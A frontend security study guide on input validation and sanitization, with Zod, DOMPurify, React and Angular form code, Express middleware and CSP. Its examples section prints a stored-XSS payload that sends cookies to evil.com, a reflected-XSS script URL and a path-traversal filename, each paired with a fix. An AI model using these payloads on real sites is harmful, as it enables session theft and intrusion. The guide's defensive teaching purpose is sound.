# 485 — Input Validation & Sanitization in Frontend

────────────────────────────────────────────────────────────────

## 1. High-Level Explanation

Input validation and sanitization form the **first layer of defense** against injection attacks,
data corruption, and unexpected application behavior. Validation checks whether data conforms
to expected rules (format, range, type, business logic). Sanitization transforms untrusted
input into a safe form before rendering or processing.

The cardinal rule: **never trust the client**. Frontend validation improves UX by giving
instant feedback; backend validation enforces security. Skipping either creates vulnerabilities
or poor user experience. This defense-in-depth approach ensures that even if an attacker
bypasses the browser entirely (via curl, Postman, intercepting proxies), the server still
rejects malicious payloads.

────────────────────────────────────────────────────────────────

## 2. Deep-Dive Explanation (Senior / Staff Level)

### A. Defense-in-Depth Principle

```
┌──────────────────────────────────────────────────────────────────┐
│                    DEFENSE-IN-DEPTH LAYERS                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Layer 1: Browser Built-ins                                      │
│  ┌────────────────────────────────────────────────┐              │
│  │ HTML5 required, pattern, maxlength, type=email │              │
│  └────────────────────────────────────────────────┘              │
│                         ▼                                        │
│  Layer 2: Client-Side Logic Validation                           │
│  ┌────────────────────────────────────────────────┐              │
│  │ Zod schemas, custom validators, format checks  │              │
│  └────────────────────────────────────────────────┘              │
│                         ▼                                        │
│  Layer 3: Sanitization Before Render                             │
│  ┌────────────────────────────────────────────────┐              │
│  │ DOMPurify, context-aware output encoding       │              │
│  └────────────────────────────────────────────────┘              │
│                         ▼                                        │
│  Layer 4: Server-Side Validation                                 │
│  ┌────────────────────────────────────────────────┐              │
│  │ Express + Zod middleware, ORM constraints       │              │
│  └────────────────────────────────────────────────┘              │
│                         ▼                                        │
│  Layer 5: CSP & HTTP Security Headers (Last Resort)              │
│  ┌────────────────────────────────────────────────┐              │
│  │ Content-Security-Policy, Trusted Types          │              │
│  └────────────────────────────────────────────────┘              │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

Why every layer matters:

| Layer              | Bypassed By                           | Still Protected By           |
|--------------------|---------------------------------------|------------------------------|
| HTML5 attributes   | DevTools edit, curl, proxy            | Client logic, server, CSP    |
| Client-side JS     | Disabled JS, intercepting proxy       | Server validation, CSP       |
| Sanitization       | Server-rendered injection (SSR)       | Server validation, CSP       |
| Server validation  | Logic bugs, incomplete schemas        | CSP, WAF, DB constraints     |
| CSP headers        | Misconfiguration, allowed origins     | Application-level validation |

### B. Validation Types

```
┌─────────────────────────────────────────────────────────────┐
│                    VALIDATION TAXONOMY                       │
├──────────────┬──────────────────────────────────────────────┤
│ Type         │ Purpose                                      │
├──────────────┼──────────────────────────────────────────────┤
│ Format       │ Email regex, phone pattern, UUID format      │
│ Range        │ Min/max for numbers, dates, string lengths   │
│ Type         │ Ensuring number is number, not string "abc"  │
│ Business     │ Age >= 18 for alcohol, coupon not expired    │
│ Sanitization │ Strip tags, encode entities, purify HTML     │
│ Cross-field  │ Password === confirmPassword, endDate > start│
│ Async        │ Username uniqueness check against server     │
└──────────────┴──────────────────────────────────────────────┘
```

### C. XSS Prevention Through Input Handling

Three XSS contexts and the correct defense for each:

```
Context 1: HTML Body
  ✗ element.innerHTML = userInput
  ✓ element.textContent = userInput

Context 2: HTML Attribute
  ✗ <img src="${userInput}">
  ✓ <img src="${encodeForHTMLAttribute(userInput)}">
  ✓ React JSX auto-escapes: <img src={userInput} />

Context 3: JavaScript Context
  ✗ eval(userInput)
  ✗ <script>var x = "${userInput}"</script>
  ✓ JSON.parse() with try/catch for data
  ✓ Never interpolate user data into JS execution contexts
```

**Framework auto-escaping behavior:**

| Framework | Auto-escapes in templates? | Dangerous escape hatches              |
|-----------|---------------------------|---------------------------------------|
| React     | Yes (JSX expressions)     | `dangerouslySetInnerHTML`             |
| Angular   | Yes (interpolation `{{ }}`)| `bypassSecurityTrustHtml()`           |
| Vue       | Yes (mustache `{{ }}`)    | `v-html` directive                    |

### D. When to Validate: onChange vs onBlur vs onSubmit

```
┌──────────────────────────────────────────────────────────────┐
│            VALIDATION TIMING TRADE-OFFS                      │
├──────────┬──────────────┬────────────┬───────────────────────┤
│ Strategy │ UX Quality   │ Perf Cost  │ When to Use           │
├──────────┼──────────────┼────────────┼───────────────────────┤
│ onChange │ Aggressive   │ High       │ Format masks, char    │
│          │ (can annoy)  │ (every     │ limits, real-time     │
│          │              │  keystroke)│ counters              │
├──────────┼──────────────┼────────────┼───────────────────────┤
│ onBlur   │ Best balance │ Medium     │ Email, phone, most    │
│          │ (validates   │ (once per  │ form fields — show    │
│          │  after user  │  field)    │ errors after user     │
│          │  finishes)   │            │ leaves the field      │
├──────────┼──────────────┼────────────┼───────────────────────┤
│ onSubmit │ Delayed      │ Low        │ Cross-field checks,   │
│          │ feedback     │ (once)     │ server-side async     │
│          │              │            │ validation            │
├──────────┼──────────────┼────────────┼───────────────────────┤
│ Hybrid   │ Best overall │ Medium     │ Show errors on blur,  │
│ (Recom.) │              │            │ clear on change,      │
│          │              │            │ re-validate on submit │
└──────────┴──────────────┴────────────┴───────────────────────┘
```

**Optimal hybrid strategy** (used in production at scale):

1. **onBlur**: Validate and show error when user leaves field
2. **onChange**: Clear existing error as user starts correcting (instant positive feedback)
3. **onSubmit**: Re-validate all fields, run cross-field and async validations
4. **After first submit failure**: Switch to onChange validation mode for failed fields

### E. Schema Validation: Zod Deep Dive

```typescript
import { z } from 'zod';

// ── Reusable field schemas ──────────────────────────────────
const emailSchema = z
  .string()
  .trim()
  .toLowerCase()
  .min(1, 'Email is required')
  .email('Invalid email format')
  .max(254, 'Email too long'); // RFC 5321

const passwordSchema = z
  .string()
  .min(12, 'Password must be at least 12 characters')
  .max(128, 'Password too long')
  .regex(/[A-Z]/, 'Must contain an uppercase letter')
  .regex(/[a-z]/, 'Must contain a lowercase letter')
  .regex(/[0-9]/, 'Must contain a number')
  .regex(/[^A-Za-z0-9]/, 'Must contain a special character');

const phoneSchema = z
  .string()
  .regex(/^\+[1-9]\d{6,14}$/, 'Must be E.164 format: +1234567890');

const urlSchema = z
  .string()
  .url('Invalid URL')
  .refine(
    (url) => url.startsWith('https://'),
    'Only HTTPS URLs are allowed'
  );

// ── Complete registration form schema ───────────────────────
export const registrationSchema = z
  .object({
    email: emailSchema,
    password: passwordSchema,
    confirmPassword: z.string(),
    displayName: z
      .string()
      .trim()
      .min(2, 'Name too short')
      .max(50, 'Name too long')
      .regex(
        /^[\p{L}\p{M}\s'-]+$/u,
        'Name can only contain letters, spaces, hyphens, and apostrophes'
      ),
    age: z
      .number({ invalid_type_error: 'Age must be a number' })
      .int('Age must be a whole number')
      .min(13, 'Must be at least 13 years old')
      .max(150, 'Invalid age'),
    website: urlSchema.optional().or(z.literal('')),
    phone: phoneSchema.optional().or(z.literal('')),
    bio: z
      .string()
      .max(500, 'Bio must be under 500 characters')
      .optional()
      .default(''),
    acceptTerms: z.literal(true, {
      errorMap: () => ({ message: 'You must accept the terms' }),
    }),
  })
  .refine((data) => data.password === data.confirmPassword, {
    message: 'Passwords do not match',
    path: ['confirmPassword'],
  });

export type RegistrationFormData = z.infer<typeof registrationSchema>;
```

### F. Sanitization: DOMPurify Configuration

```typescript
import DOMPurify from 'dompurify';

// ── Strict config: comments, blog posts ─────────────────────
const STRICT_CONFIG: DOMPurify.Config = {
  ALLOWED_TAGS: [
    'b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
    'h2', 'h3', 'h4', 'blockquote', 'code', 'pre',
  ],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],  // force target on links
  FORCE_BODY: true,
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false,
};

// ── Hook: force all links to open safely ────────────────────
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

// ── Sanitization wrapper ────────────────────────────────────
export function sanitizeHTML(dirty: string): string {
  return DOMPurify.sanitize(dirty, STRICT_CONFIG);
}

// ── For plain text contexts (strip ALL HTML) ────────────────
export function stripHTML(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [],
  });
}

// ── Usage in React ──────────────────────────────────────────
function RichTextDisplay({ content }: { content: string }) {
  const clean = sanitizeHTML(content);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### G. Input Sanitization Utility (Non-HTML Contexts)

```typescript
// ── Generic input sanitizer for non-HTML form fields ────────

export const sanitizeInput = {
  /** Remove leading/trailing whitespace, collapse internal spaces */
  text(input: string): string {
    return input.trim().replace(/\s+/g, ' ');
  },

  /** Strip everything except digits */
  numericOnly(input: string): string {
    return input.replace(/[^\d]/g, '');
  },

  /** Strip everything except digits, +, -, (, ), spaces */
  phone(input: string): string {
    return input.replace(/[^\d+\-() ]/g, '');
  },

  /** Lowercase, trim, remove consecutive dots in local part */
  email(input: string): string {
    return input.trim().toLowerCase();
  },

  /** Remove null bytes and control characters (except \n \r \t) */
  removeControlChars(input: string): string {
    // eslint-disable-next-line no-control-regex
    return input.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
  },

  /** Escape for SQL LIKE patterns (application-level, not a substitute for parameterized queries) */
  sqlLikeEscape(input: string): string {
    return input.replace(/[%_\\]/g, '\\$&');
  },

  /** Sanitize filename: remove path traversal, restrict to safe chars */
  filename(input: string): string {
    return input
      .replace(/[/\\]/g, '')      // remove path separators
      .replace(/\.\./g, '')       // remove path traversal
      .replace(/[^\w.\-]/g, '_')  // restrict to safe chars
      .substring(0, 255);         // enforce max length
  },
};
```

### H. Zod + React Hook Form Integration

```typescript
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { registrationSchema, type RegistrationFormData } from './schemas';

function RegistrationForm() {
  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting, dirtyFields },
    setError,
  } = useForm<RegistrationFormData>({
    resolver: zodResolver(registrationSchema),
    mode: 'onBlur',          // validate on blur
    reValidateMode: 'onChange', // re-validate on change after first error
    defaultValues: {
      email: '',
      password: '',
      confirmPassword: '',
      displayName: '',
      age: undefined,
      website: '',
      phone: '',
      bio: '',
      acceptTerms: false as unknown as true,
    },
  });

  const onSubmit = async (data: RegistrationFormData) => {
    try {
      const response = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        const serverErrors = await response.json();
        // Map server validation errors back to form fields
        Object.entries(serverErrors.fieldErrors ?? {}).forEach(
          ([field, message]) => {
            setError(field as keyof RegistrationFormData, {
              type: 'server',
              message: message as string,
            });
          }
        );
        return;
      }
      // success handling...
    } catch {
      setError('root', { message: 'Network error. Please retry.' });
    }
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} noValidate>
      <div>
        <label htmlFor="email">Email</label>
        <input
          id="email"
          type="email"
          autoComplete="email"
          aria-invalid={!!errors.email}
          aria-describedby={errors.email ? 'email-error' : undefined}
          {...register('email')}
        />
        {errors.email && (
          <p id="email-error" role="alert">{errors.email.message}</p>
        )}
      </div>

      <div>
        <label htmlFor="password">Password</label>
        <input
          id="password"
          type="password"
          autoComplete="new-password"
          aria-invalid={!!errors.password}
          aria-describedby={errors.password ? 'pw-error' : undefined}
          {...register('password')}
        />
        {errors.password && (
          <p id="pw-error" role="alert">{errors.password.message}</p>
        )}
      </div>

      <div>
        <label htmlFor="confirmPassword">Confirm Password</label>
        <input
          id="confirmPassword"
          type="password"
          autoComplete="new-password"
          aria-invalid={!!errors.confirmPassword}
          {...register('confirmPassword')}
        />
        {errors.confirmPassword && (
          <p role="alert">{errors.confirmPassword.message}</p>
        )}
      </div>

      <div>
        <label htmlFor="displayName">Display Name</label>
        <input
          id="displayName"
          type="text"
          autoComplete="name"
          aria-invalid={!!errors.displayName}
          {...register('displayName')}
        />
        {errors.displayName && (
          <p role="alert">{errors.displayName.message}</p>
        )}
      </div>

      <div>
        <label htmlFor="age">Age</label>
        <input
          id="age"
          type="number"
          inputMode="numeric"
          aria-invalid={!!errors.age}
          {...register('age', { valueAsNumber: true })}
        />
        {errors.age && <p role="alert">{errors.age.message}</p>}
      </div>

      {errors.root && (
        <p role="alert" className="form-error">{errors.root.message}</p>
      )}

      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? 'Registering...' : 'Register'}
      </button>
    </form>
  );
}
```

### I. Angular Reactive Forms with Custom Validators

```typescript
// ── validators.ts ───────────────────────────────────────────
import { AbstractControl, ValidationErrors, AsyncValidatorFn } from '@angular/forms';
import { Observable, of, timer } from 'rxjs';
import { map, switchMap, catchError } from 'rxjs/operators';

// Synchronous: no script tags in input
export function noScriptValidator(
  control: AbstractControl
): ValidationErrors | null {
  const forbidden = /<script[\s>]/i;
  return forbidden.test(control.value) ? { noScript: true } : null;
}

// Synchronous: password strength
export function passwordStrengthValidator(
  control: AbstractControl
): ValidationErrors | null {
  const value: string = control.value ?? '';
  const checks = {
    hasUpper: /[A-Z]/.test(value),
    hasLower: /[a-z]/.test(value),
    hasDigit: /\d/.test(value),
    hasSpecial: /[^A-Za-z0-9]/.test(value),
    minLength: value.length >= 12,
  };
  const failed = Object.entries(checks)
    .filter(([, pass]) => !pass)
    .map(([key]) => key);

  return failed.length > 0
    ? { passwordStrength: { requirements: failed } }
    : null;
}

// Cross-field: password match
export function passwordMatchValidator(
  control: AbstractControl
): ValidationErrors | null {
  const password = control.get('password')?.value;
  const confirm = control.get('confirmPassword')?.value;
  if (password && confirm && password !== confirm) {
    control.get('confirmPassword')?.setErrors({ passwordMatch: true });
    return { passwordMatch: true };
  }
  return null;
}

// Async: check username availability (debounced)
export function usernameAvailabilityValidator(
  http: HttpClient
): AsyncValidatorFn {
  return (control: AbstractControl): Observable<ValidationErrors | null> => {
    if (!control.value || control.value.length < 3) {
      return of(null);
    }
    return timer(400).pipe(  // debounce 400ms
      switchMap(() =>
        http.get<{ available: boolean }>(
          `/api/check-username?q=${encodeURIComponent(control.value)}`
        )
      ),
      map((res) => (res.available ? null : { usernameTaken: true })),
      catchError(() => of(null))  // fail open on network error
    );
  };
}

// ── registration.component.ts ───────────────────────────────
import { FormBuilder, FormGroup, Validators } from '@angular/forms';

@Component({ selector: 'app-registration', templateUrl: './registration.component.html' })
export class RegistrationComponent implements OnInit {
  form!: FormGroup;

  constructor(private fb: FormBuilder, private http: HttpClient) {}

  ngOnInit(): void {
    this.form = this.fb.group(
      {
        username: [
          '',
          [Validators.required, Validators.minLength(3), noScriptValidator],
          [usernameAvailabilityValidator(this.http)],
        ],
        email: ['', [Validators.required, Validators.email]],
        password: [
          '',
          [Validators.required, Validators.minLength(12), passwordStrengthValidator],
        ],
        confirmPassword: ['', [Validators.required]],
      },
      { validators: passwordMatchValidator }
    );
  }

  onSubmit(): void {
    if (this.form.valid) {
      // submit...
    } else {
      this.form.markAllAsTouched(); // show all errors
    }
  }
}
```

### J. Server-Side Validation: Express + Zod Middleware

```typescript
// ── middleware/validate.ts ───────────────────────────────────
import { Request, Response, NextFunction } from 'express';
import { ZodSchema, ZodError } from 'zod';

interface ValidateOptions {
  body?: ZodSchema;
  query?: ZodSchema;
  params?: ZodSchema;
}

export function validate(schemas: ValidateOptions) {
  return (req: Request, res: Response, next: NextFunction) => {
    const errors: Record<string, unknown> = {};

    for (const [source, schema] of Object.entries(schemas)) {
      if (!schema) continue;
      const result = schema.safeParse(
        req[source as keyof typeof schemas]
      );
      if (!result.success) {
        errors[source] = formatZodErrors(result.error);
      } else {
        // Replace raw input with parsed + transformed data
        (req as Record<string, unknown>)[source] = result.data;
      }
    }

    if (Object.keys(errors).length > 0) {
      return res.status(400).json({
        success: false,
        errors,
      });
    }

    next();
  };
}

function formatZodErrors(error: ZodError) {
  return Object.fromEntries(
    error.issues.map((issue) => [
      issue.path.join('.'),
      issue.message,
    ])
  );
}

// ── routes/auth.ts ──────────────────────────────────────────
import { Router } from 'express';
import { registrationSchema } from '../shared/schemas'; // Same Zod schema!
import { validate } from '../middleware/validate';

const router = Router();

router.post(
  '/register',
  validate({ body: registrationSchema }),
  async (req, res) => {
    // req.body is now typed and validated
    const data: RegistrationFormData = req.body;
    // ... create user in DB
    res.status(201).json({ success: true });
  }
);
```

**Key insight: share the Zod schema** between frontend and backend in a monorepo or shared package.
This guarantees identical validation rules on both sides with zero drift.

```
┌──────────────────────────────────────────────┐
│            SHARED SCHEMA APPROACH             │
│                                               │
│  packages/shared/schemas/registration.ts      │
│         ┌────────────┐                        │
│         │  Zod Schema │                       │
│         └──────┬─────┘                        │
│           ┌────┴────┐                         │
│     ┌─────▼─┐   ┌───▼──────┐                 │
│     │ React │   │ Express  │                  │
│     │ Form  │   │ Middleware│                  │
│     └───────┘   └──────────┘                  │
│   Frontend         Backend                    │
│   (instant UX)     (enforced security)        │
└──────────────────────────────────────────────┘
```

### K. CSP as the Last Defense Layer

Even with perfect validation, CSP mitigates what slips through:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  require-trusted-types-for 'script';
```

**Trusted Types** (the modern complement to CSP for DOM XSS):

```typescript
// ── trusted-types policy ────────────────────────────────────
if (window.trustedTypes?.createPolicy) {
  const sanitizerPolicy = window.trustedTypes.createPolicy('sanitizer', {
    createHTML: (input: string) => DOMPurify.sanitize(input, STRICT_CONFIG),
  });

  // Usage: element.innerHTML = sanitizerPolicy.createHTML(userInput);
  // Any other innerHTML assignment throws a TypeError
}
```

### L. Anti-Patterns & Corrections

```
┌──────────────────────────────────────────────────────────────────┐
│                   ANTI-PATTERN CATALOG                            │
├──────┬───────────────────────────┬───────────────────────────────┤
│  #   │ Anti-Pattern              │ Correct Approach              │
├──────┼───────────────────────────┼───────────────────────────────┤
│  1   │ Client-only validation    │ Always duplicate on server.   │
│      │ (no server check)         │ Share schemas via Zod.        │
├──────┼───────────────────────────┼───────────────────────────────┤
│  2   │ Regex-only email check    │ Use schema + actual delivery  │
│      │ /^[\w]+@[\w]+\.[\w]+$/    │ verification (send a code).   │
├──────┼───────────────────────────┼───────────────────────────────┤
│  3   │ Blacklist approach        │ Whitelist (allowlist) only.   │
│      │ "block <script>"          │ Define what IS allowed, not   │
│      │                           │ what isn't.                   │
├──────┼───────────────────────────┼───────────────────────────────┤
│  4   │ innerHTML = userInput     │ textContent for plain text.   │
│      │                           │ DOMPurify for rich text.      │
├──────┼───────────────────────────┼───────────────────────────────┤
│  5   │ Not re-validating on      │ Always re-validate. Client    │
│      │ server after client check │ can be bypassed trivially.    │
├──────┼───────────────────────────┼───────────────────────────────┤
│  6   │ Sanitizing on input       │ Store raw, sanitize on output │
│      │ (before storage)          │ (context-dependent encoding). │
├──────┼───────────────────────────┼───────────────────────────────┤
│  7   │ Custom sanitizer regex    │ Use DOMPurify. HTML parsing   │
│      │ .replace(/<[^>]*>/g, '')  │ is too complex for regex.     │
├──────┼───────────────────────────┼───────────────────────────────┤
│  8   │ Trusting hidden fields    │ Hidden fields are as          │
│      │ or disabled inputs        │ manipulable as visible ones.  │
├──────┼───────────────────────────┼───────────────────────────────┤
│  9   │ Encoding output only once │ Encode for each context:      │
│      │ for all contexts          │ HTML, attribute, JS, URL.     │
├──────┼───────────────────────────┼───────────────────────────────┤
│ 10   │ Displaying raw error      │ Log detailed errors server-   │
│      │ messages to user          │ side; show generic messages   │
│      │                           │ to user (no stack traces).    │
└──────┴───────────────────────────┴───────────────────────────────┘
```

────────────────────────────────────────────────────────────────

## 3. Clear Real-World Examples

**Example 1: E-Commerce Product Review**
A review form accepts rich text. Without DOMPurify, an attacker submits
`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`.
This stored XSS payload fires for every user viewing the review.
**Fix:** Sanitize with DOMPurify on render. CSP `script-src 'self'` blocks inline handlers.

**Example 2: Search Box Reflected XSS**
URL: `https://shop.com/search?q=<script>alert(1)</script>`.
The server echoes the query into HTML without encoding.
**Fix:** Server-side output encoding, CSP `script-src 'nonce-...'`, Trusted Types.

**Example 3: API Parameter Tampering**
Frontend sends `{ "price": 0.01, "productId": "abc123" }` to a checkout endpoint.
Frontend validation limits price to catalog value, but an attacker sends raw HTTP.
**Fix:** Server always looks up the canonical price from the database. Never trust
client-supplied prices, roles, or permissions.

**Example 4: File Upload Name Traversal**
User uploads a file named `../../../etc/passwd`. Without filename sanitization,
the server writes to an unintended path.
**Fix:** `sanitizeInput.filename()` on both client and server. Server generates
its own filename (UUID) and stores the original name as metadata only.

────────────────────────────────────────────────────────────────

## 4. Interview-Oriented Explanation

> In my role at SAP Labs, I led a security hardening initiative that achieved an
> **80% reduction in security vulnerabilities** across our frontend applications.
> A core part of that effort was implementing a defense-in-depth input validation
> strategy.
>
> We established a shared Zod schema library in our monorepo. The same schemas
> validate forms on the React frontend using React Hook Form's zodResolver and
> re-validate every request on the Express backend via middleware. This eliminated
> an entire class of bugs where frontend and backend validation rules would drift
> apart.
>
> For XSS prevention, we adopted a strict policy: no `dangerouslySetInnerHTML`
> without DOMPurify, enforced via ESLint rules with zero exceptions. For our WYSIWYG
> editor, we configured DOMPurify with an explicit allowlist of safe tags and
> attributes. We also deployed Content-Security-Policy headers with nonce-based
> script sources and enabled Trusted Types, which gave us runtime protection even
> against library vulnerabilities.
>
> One key lesson: we moved from "sanitize on input" to "sanitize on output." We
> store the raw user input and encode/sanitize at render time based on context. This
> is critical because the same data might appear in an HTML body, an HTML attribute,
> a JSON API response, or a PDF — each needing different encoding.
>
> For accessibility, all validation errors are announced via `aria-invalid` and
> `aria-describedby` attributes linked to error messages with `role="alert"`. This
> was part of our WCAG AA compliance work that I led. The combination of instant
> feedback (onBlur validation with onChange clearing) and accessible error
> presentation contributed to our Lighthouse score improvement from 60 to 95.

────────────────────────────────────────────────────────────────

## 5. Code Examples

See Section 2 subsections E through K for complete implementations:

- **2E**: Zod schema with reusable field validators
- **2F**: DOMPurify sanitization wrapper with hook configuration
- **2G**: Input sanitization utility for non-HTML contexts
- **2H**: Zod + React Hook Form complete registration form
- **2I**: Angular Reactive Forms with sync, async, and cross-field validators
- **2J**: Express Zod validation middleware with shared schema approach
- **2K**: CSP headers and Trusted Types policy

────────────────────────────────────────────────────────────────

## 6. Why & How Summary

| Aspect                  | Key Takeaway                                                     |
|-------------------------|------------------------------------------------------------------|
| **Why validate?**       | Prevents injection, data corruption, and business logic abuse    |
| **Why both sides?**     | Frontend = UX, backend = security. Neither alone is sufficient   |
| **Why Zod?**            | TypeScript-native, composable, shareable between client & server |
| **Why DOMPurify?**      | Battle-tested HTML sanitizer; regex cannot parse HTML safely     |
| **Why allowlist?**      | Blacklists always miss edge cases; allowlists are closed by default |
| **Why sanitize on output?** | Same data needs different encoding per context (HTML/attr/JS/URL) |
| **Why CSP + Trusted Types?** | Defense-in-depth: catches what validation misses             |
| **Why onBlur + onChange?**   | Best UX balance: error after leaving, instant clearing      |
| **How to share schemas?**    | Monorepo shared package or npm package for Zod schemas      |
| **How to handle rich text?** | DOMPurify with strict config + `dangerouslySetInnerHTML`    |
| **How to test validation?**  | Unit-test Zod schemas directly; E2E-test form flows         |

────────────────────────────────────────────────────────────────
